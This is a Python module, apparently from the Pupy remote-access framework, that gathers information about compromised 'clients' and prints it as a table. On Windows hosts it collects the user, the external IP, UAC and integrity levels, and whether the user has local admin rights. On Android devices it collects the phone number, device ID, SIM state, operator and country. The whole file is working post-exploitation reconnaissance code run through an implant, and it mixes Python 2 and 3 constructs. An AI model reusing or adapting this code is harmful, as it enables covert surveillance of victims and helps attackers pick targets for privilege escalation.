# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.PupyOutput import Table

__class_name__="GetInfo"

@config(cat="gather")
class GetInfo(PupyModule):
    """ get some informations about one or multiple clients """
    dependencies = {
        'windows': ['pupwinutils.security'],
        'android': ['pupydroid.utils']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(
            prog='get_info',
            description=cls.__doc__
        )

    def run(self, args):
        commonKeys = [
            "hostname", "user", "release", "version", "cmdline",
            "os_arch", "proc_arch", "pid", "exec_path", "cid",
            "address", "macaddr", "spi", "revision", "node",
            "debug_logfile", "native", "proxy", "external_ip"
        ]
        pupyKeys = ["launcher", "launcher_args"]
        linuxKeys = []
        macKeys = []

        infos = [(k, self.client.desc[k]) for k in commonKeys if k in self.client.desc]
        if self.client.is_windows():
            windKeys = ["uac_lvl","intgty_lvl"]
            infos.extend((k, self.client.desc[k]) for k in windKeys)
            can_get_admin_access = self.client.remote(
                'pupwinutils.security', 'can_get_admin_access', False)

            currentUserIsLocalAdmin = can_get_admin_access()

            value = '?'
            value = 'Yes' if currentUserIsLocalAdmin else 'No'
            infos.append(('local_adm', value))

        elif self.client.is_linux():
            infos.extend((k, self.client.desc[k]) for k in linuxKeys)
        elif self.client.is_darwin():
            infos.extend((k, self.client.desc[k]) for k in macKeys)
        elif self.client.is_android():
            utils = self.client.remote('pupydroid.utils')

            wifiConnected = utils.isWiFiConnected()
            if wifiConnected:
                androidCtionType = {'info':"WiFi", 'fast':True}
            else:
                androidCtionType = utils.getMobileNetworkType()

            infos.append(('ction_type', "{0} (fast:{1})".format(androidCtionType['info'], androidCtionType['fast'])))
            androidID = utils.getAndroidID()
            infos.append(("android_id",androidID))
            wifiEnabled = utils.isWiFiEnabled()
            infos.append(("wifi_enabled",wifiConnected or wifiEnabled))
            infoBuild = utils.getInfoBuild()
            infos.extend(
                (
                    ("device_name", infoBuild['deviceName']),
                    ("manufacturer", infoBuild['manufacturer']),
                    ("model", infoBuild['model']),
                    ("product", infoBuild['product']),
                    ("bootloader_version", infoBuild['bootloaderVersion']),
                    ("radio_version", infoBuild['radioVersion']),
                    ("release", infoBuild['release']),
                )
            )
            battery = utils.getBatteryStats()
            infos.extend(
                (
                    ("battery_%", battery['percentage']),
                    ("is_charging", battery['isCharging']),
                )
            )
            simState = utils.getSimState()
            infos.append(("sim_state",simState))
            deviceId = utils.getDeviceId()
            infos.append(("device_id",deviceId))
            #Needs API level 23. When this API will be used, these 2 following line should be uncommented
            try:
                simInfo = utils.getSimInfo()
                infos.append(("sim_count",simInfo))
            except:
                pass

            if ("absent" not in simState) and ("unknown" not in simState):
                phoneNb = utils.getPhoneNumber()
                infos.append(("phone_nb",phoneNb))
                simCountryIso = utils.getSimCountryIso()
                infos.append(("sim_country",simCountryIso))
                networkCountryIso = utils.getNetworkCountryIso()
                infos.append(("network_country",networkCountryIso))
                networkOperatorName = utils.getNetworkOperatorName()
                infos.append(("network_operator",networkOperatorName))
                isNetworkRoaming = utils.isNetworkRoaming()
                infos.append(("is_roaming",isNetworkRoaming))
            else:
                infos.extend(
                    (
                        ("phone_nb", "N/A"),
                        ("sim_country", "N/A"),
                        ("network_country", "N/A"),
                        ("network_operator", "N/A"),
                        ("device_id", "N/A"),
                    )
                )
        for k in pupyKeys:
            if k in self.client.desc:
                infos.append((k, self.client.desc[k]))

        infos.append(('platform', f"{self.client.platform}/{self.client.arch or '?'}"))

        #For remplacing None or "" value by "?"
        infoTemp = []
        for i, (key, value) in enumerate(infos):
            if value is None or value == "":
                value = "?"
            elif type(value) in (list, tuple):
                value = ' '.join([unicode(x) for x in value])
            elif key == 'cid':
                value = '{:016x}'.format(value)
            infoTemp.append((key, value))

        infos = infoTemp

        table = [{
            'KEY': k,
            'VALUE': v
        } for k,v in infoTemp]

        self.log(Table(table, ['KEY', 'VALUE'], legend=False))
